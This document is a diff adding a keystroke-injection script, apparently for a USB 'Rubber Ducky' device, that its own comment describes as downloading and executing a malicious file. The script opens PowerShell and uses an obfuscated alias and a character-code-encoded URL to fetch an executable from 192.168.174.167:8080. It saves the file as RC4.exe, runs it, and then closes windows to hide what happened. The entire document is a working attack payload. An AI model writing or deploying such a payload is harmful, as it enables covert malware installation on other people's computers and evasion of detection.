@@ -1,0 +1,17 @@
+REM script for downloading and execute malicious file
+ESC
+WINDOWS R
+DELAY 50
+STRING powershell
+ENTER
+DELAY 250
+REM obfuscated Invoke-WebRequest -Uri "http://192.168.174.167:8080" -OutFile "RC4.exe"
+STRING & (gal i?r) -Uri (-join (104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,55,52,46,49,54,55,58,56,48,56,48,47,65,69,83,46,101,120,101|%{[char]$_})) -OutFile RC4.exe
+ENTER
+DELAY 250
+STRING ./RC4.exe
+ENTER
+DELAY 200
+ALT TAB
+DELAY 100
+ALT F4
